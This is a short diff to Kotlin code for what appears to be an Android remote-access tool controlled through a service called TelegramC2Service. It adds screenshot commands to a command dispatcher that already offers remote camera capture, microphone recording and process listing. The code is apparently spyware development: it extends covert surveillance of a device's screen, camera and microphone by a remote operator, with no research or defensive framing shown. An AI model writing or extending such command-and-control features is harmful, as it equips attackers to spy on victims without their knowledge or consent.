@@ -15,6 +15,11 @@ object CommandExecutor {
         "running_processes"  -> JSONObject().put("error", "not_implemented")
 
         // Camera / media
+        // screenshot / screen_record are handled in TelegramC2Service, which owns
+        // the capture session. Declared here so the catalogue and the executor
+        // do not silently disagree about which commands exist.
+        "screenshot"         -> JSONObject().put("error", "handled_by_service")
+        "screenshot_status"  -> AccessibilityScreenshot.status()
         "camera_photo"       -> Camera.capture(ctx, args.optString("camera", "back"))
         "mic_record"         -> Audio.record(ctx, args.optInt("duration", 10))
         "camera_stream"      -> JSONObject().put("error", "not_implemented")
